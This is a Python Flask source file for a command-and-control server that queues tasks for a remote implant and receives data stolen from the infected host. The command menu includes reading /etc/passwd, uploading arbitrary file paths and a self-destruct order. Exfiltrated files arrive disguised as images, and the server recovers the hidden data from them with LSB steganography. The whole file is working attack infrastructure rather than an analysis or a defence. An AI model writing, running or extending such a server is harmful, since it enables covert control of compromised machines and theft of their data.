from flask import Flask, request, jsonify
import os
from queue import *
from stegano import lsb

app = Flask(__name__)

# Predefined command menu
command_menu = {
    0: 'ls -lah',
    1: 'cat /etc/passwd',
    2: 'upload',
    3: 'destroy', # Special non-Linux command that causes client to self-destruct
}

# Queue of tasks assigned to the implant
tasks = Queue()

# A controller can invoke the default endpoint to view the command menu
@app.route('/')
def menu():
    return jsonify(command_menu)

# A controller can invoke this endpoint to task the client
@app.route('/assign/<int:cmd_index>', methods=['POST'])
def assign_command(cmd_index):
    if 0 <= cmd_index < len(command_menu):
        if cmd_index == 2:
            data = request.get_json()
            path = data.get('path')
            if not path:
                return jsonify({"error": "Missing 'path'"}), 400
            tasks.put(f"upload {path}")
            return jsonify({"message": f"Queued upload: {path}"})
        else:
            tasks.put(command_menu[cmd_index])
            return jsonify({"message": f"Queued: {command_menu[cmd_index]}"})
    else:
        return jsonify({"error": "Bad Request"}), 400


# Implant periodically polls this endpoint to get a task
@app.route('/task', methods=['GET'])
def get_task():
    if not tasks.empty():
        task = tasks.get()
        return jsonify({"task": task})
    return jsonify({"task": "sleep 10"})


# Implant invokes this endpoint to send exfiltrated data back to the server
# Implant invokes this endpoint to send images back to the server
@app.route('/upload', methods=['POST'])
def receive_data():
    file = request.files.get('file')
    if file:
        filename = file.filename
        save_path = os.path.join('exfiltrated_data', filename)

        # Make sure directory exists
        os.makedirs('exfiltrated_data', exist_ok=True)

        # Save the uploaded file
        file.save(save_path)
        print(f"Received and saved file: {filename}")
        
        deobfuscated_data = lsb.reveal(save_path)
        print(deobfuscated_data)
        
        return jsonify({"Success": "Yay"}), 200

    else:
        return jsonify({"error": "No file provided"}), 400
    
    


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
